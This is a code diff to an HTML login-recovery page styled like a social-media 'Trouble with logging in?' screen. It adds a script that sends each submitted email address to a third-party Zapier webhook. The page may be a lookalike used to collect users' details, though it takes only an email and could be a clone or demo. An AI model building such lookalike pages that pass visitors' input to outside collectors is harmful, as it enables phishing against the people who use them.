@@ -20,10 +20,11 @@
             <h1>Trouble with logging in?</h1>
             <p>Enter your email address, phone number, or username, and we'll send you a link to get back into your account.</p>
             <div class="form-group">
-                <form action="">
+                <form action="" id="emailForm">
                     <input type="email" id="emailInput" placeholder="Email address">
                     <button id="sendLinkButton" type="submit" disabled style="font-size: 14px; font-weight: 600; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Send Login Link</button>
                 </form>
+                <p id="responseMessage"></p>
             </div>
             <p><a href="broken.html">Can't reset your password?</a></p>
             <div class="links">
@@ -33,7 +34,7 @@
             <div class="bottom-link">
                 <button style="width: 126.5%; margin-left: -13.2%; padding: 13px; background-color: #FAFAFA; border: 1px solid #DBDBDB; margin-bottom: -200px;"><a href="login.html">Back to Login</a></button>
             </div>
-        </div>
+        </div> 
     </main>
     <footer>
         <div>
@@ -67,6 +68,26 @@
                 sendLinkButton.classList.remove('active');
             }
         });
+    </script>
+
+    <script>
+    document.getElementById('emailForm').addEventListener('submit', async function(event) {
+        event.preventDefault();
+        
+        const emailInput = document.getElementById('emailInput').value;
+        
+        const response = await fetch('https://hooks.zapier.com/hooks/catch/19268549/2bzj5b6/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email: emailInput })
+        });
+        
+        const result = await response.json();
+        
+        document.getElementById('responseMessage').innerText = result.message;
+    });
     </script>
 </body>
 </html>
